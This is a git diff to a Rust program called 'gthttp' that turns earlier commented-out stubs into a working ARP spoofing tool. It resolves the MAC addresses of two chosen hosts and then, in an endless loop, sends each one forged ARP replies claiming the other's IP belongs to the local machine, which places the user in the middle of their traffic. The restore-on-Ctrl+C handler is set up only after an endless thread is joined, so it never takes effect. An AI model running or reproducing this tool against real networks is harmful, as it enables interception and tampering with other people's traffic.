@@ -1,13 +1,27 @@
 extern crate clap;
+extern crate ctrlc;
 extern crate arpspoofr;
 
 use arpspoofr::*;
 
-use std::net::IpAddr;
+use std::net::{IpAddr, Ipv4Addr};
+use std::thread;
+use std::sync::Arc;
+use std::time::Duration;
 use clap::{App, Arg};
 
-fn main() {
-    let matches = App::new("gthttp")
+use pnet::datalink::MacAddr;
+use pnet::packet::arp::ArpOperations;
+use pnet::datalink::DataLinkSender;
+
+struct Arguments {
+    interface: String,
+    source_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+}
+
+fn parse_args() -> Arguments {
+    let args = App::new("gthttp")
         .arg(Arg::with_name("interface")
              .value_name("INTERFACE")
              .required(true)
@@ -22,35 +36,113 @@ fn main() {
              .help("Target IPv4 Address"))
         .get_matches();
 
+    let (iface, source_ip, target_ip) = {
+        let iface = args.value_of("interface").unwrap().into();
+        let sip = match args.value_of("source_ip").unwrap().parse().unwrap() {
+            IpAddr::V4(v4) => v4,
+            _ => panic!("source_ip is not a valid IPv4 address")
+        };
+
+        let tip = match args.value_of("target_ip").unwrap().parse().unwrap() {
+            IpAddr::V4(v4) => v4,
+            _ => panic!("target_ip is not a valid IPv4 address")
+        };
+
+        (iface, sip, tip)
+    };
+
+    Arguments {
+        interface: iface,
+        source_ip: source_ip,
+        target_ip: target_ip
+    }
+}
+
+fn spoof_arp(tx: &mut DataLinkSender,
+             local_mac: MacAddr,
+             source_ip: Ipv4Addr,
+             source_mac: MacAddr,
+             target_ip: Ipv4Addr,
+             target_mac: MacAddr) {
+    // Send packet to bind source ip to local mac
+    send_arp(&mut *tx, source_ip, local_mac, target_ip, target_mac, ArpOperations::Reply);
+
+    // Send packet to bind target ip to local mac
+    send_arp(&mut *tx, target_ip, local_mac, source_ip, source_mac, ArpOperations::Reply);
+}
+
+struct GthttpCtx {
+    interface: String,
+    local_ip: Ipv4Addr,
+    local_mac: MacAddr,
+    source_ip: Ipv4Addr,
+    source_mac: MacAddr,
+    target_ip: Ipv4Addr,
+    target_mac: MacAddr,
+}
+
+fn collect_target_info() -> GthttpCtx {
+    let args = parse_args();
+
     // TODO: handle case where interface is not valid
-    let (mut tx, mut rx, iface) = open_interface(matches.value_of("interface").unwrap());
+    let (mut tx, mut rx, iface) = open_interface(&args.interface);
 
     let local_mac = iface.mac_address();
     let local_ip = iface.ips.first().unwrap().ip();
+    let local_ipv4 = match local_ip {
+        IpAddr::V4(local_ipv4) => local_ipv4,
+        _ => panic!("You don't have an IPv4 address I guess?")
+    };
 
-    println!("My IP: {}", local_ip);
-    
-    if let IpAddr::V4(local_ipv4) = local_ip {
-        // TODO: Take in as input
-        let source_ip_res = matches.value_of("source_ip").unwrap().parse();
-        let target_ip_res = matches.value_of("target_ip").unwrap().parse();
+    // Lookup mac for source and target
+    let source_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, args.source_ip);
+    let target_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, args.target_ip);
 
-        // TODO: Nested if lets suck. Find a better way
-        if let Ok(source_ip) = source_ip_res {
-            if let Ok(target_ip) = target_ip_res {
-                // Lookup mac for source and target
-                let source_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, source_ip);
-                println!("Source MAC: {}", source_mac);
+    GthttpCtx {
+        interface: args.interface,
+        local_ip: local_ipv4,
+        local_mac: local_mac,
+        source_ip: args.source_ip,
+        source_mac: source_mac,
+        target_ip: args.target_ip,
+        target_mac: target_mac,
 
-                let target_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, target_ip);
-                println!("Target MAC: {}", target_mac);
-
-                // Send packet to bind source ip to local mac
-                //send_arp(&mut *tx, source_ip, local_mac, target_ip, target_mac);
-
-                // Send packet to bind target ip to local mac
-                //send_arp(&mut *tx, target_ip, local_mac, source_ip, source_mac);
-            }
-        }
     }
+}
+
+fn main() {
+    let ctx = Arc::new(collect_target_info());
+
+    println!("My IP: {}", ctx.local_ip);
+    println!("Source MAC: {}", ctx.source_mac);
+    println!("Target MAC: {}", ctx.target_mac);
+
+    // Spoof arp responses so we can receive traffic for the source and target
+    let ctx1 = ctx.clone();
+    let arp_spoof_thread = thread::spawn(move || {
+        let ctx = ctx1;
+        let (mut tx, _, _) = open_interface(&ctx.interface);
+        loop {
+            spoof_arp(&mut *tx, ctx.local_mac, ctx.source_ip, ctx.source_mac,
+                      ctx.target_ip, ctx.target_mac);
+            thread::sleep(Duration::from_millis(1000));
+        }
+    });
+
+    let _res = arp_spoof_thread.join();
+
+    let ctx2 = ctx.clone();
+    ctrlc::set_handler(move || {
+        println!("received Ctrl+C!");
+
+        // Borrow cause I guess that works? IDK, rust is weird
+        let ctx = &ctx2;
+        let (mut tx, _, _) = open_interface(&ctx.interface);
+
+        // Restore correct state of the world
+        send_arp(&mut *tx, ctx.source_ip, ctx.source_mac,
+                 ctx.target_ip, ctx.target_mac, ArpOperations::Reply);
+        send_arp(&mut *tx, ctx.target_ip, ctx.target_mac,
+                 ctx.source_ip, ctx.source_mac, ArpOperations::Reply);
+    }).expect("Error setting Ctrl-C handler");
 }
